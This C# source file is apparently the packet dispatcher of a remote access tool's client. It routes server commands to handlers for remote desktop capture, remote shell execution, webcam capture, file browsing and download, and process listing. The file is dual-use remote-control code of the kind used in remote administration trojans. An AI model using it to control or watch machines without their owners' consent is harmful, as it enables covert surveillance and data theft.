﻿using Client.Controllers;
using Client.Packets.ServerPackets;

namespace Client.Packets
{
    public static class PacketHandler
    {
        public static void packetChecker(ClientMosaic client, IPackets packet)
        {
            var type = packet.Type;

            if (type == TypePackets.GetMonitors)
            {
                RemoteDesktopController.getMonitors(client);
            }
            else if (type == TypePackets.GetDesktop)
            {
                RemoteDesktopController.getDesktop((GetDesktop)packet, client);
            }
            else if (type == TypePackets.GetExecuteShellCmd)
            {
                RemoteShellController.getExecuteShellCmd((GetExecuteShellCmd)packet, client);
            }
            else if (type == TypePackets.GetAvailableWebcams)
            {
                RemoteWebcamController.getAvailableWebcams((GetAvailableWebcams)packet, client);
            }
            else if (type == TypePackets.GetWebcam)
            {
                RemoteWebcamController.getWebcam((GetWebcam)packet, client);
            }
            else if (type == TypePackets.StopWebcam)
            {
                RemoteWebcamController.stopWebcam();
            }
            else if (type == TypePackets.GetDrives)
            {
                //System.Windows.Forms.MessageBox.Show("getDrives");
                FileManagerController.getDrives((GetDrives)packet, client);
            }
            else if(type == TypePackets.GetDirectory)
            {
                FileManagerController.getDirectory((GetDirectory)packet, client);
            }
            else if (type == TypePackets.DoDownloadFile)
            {
                FileManagerController.doDownloadFile((DoDownloadFile)packet, client);
            }
            else if (type == TypePackets.DoDownloadFileCancel)
            {
                //System.Windows.Forms.MessageBox.Show("cancel");
                FileManagerController.doDownloadFileCancel((DoDownloadFileCancel)packet, client);
            }
            else if(type == TypePackets.GetProcesses)
            {
                TaskManagerController.getProcesses((GetProcesses)packet, client);
            }
        }
    }
}
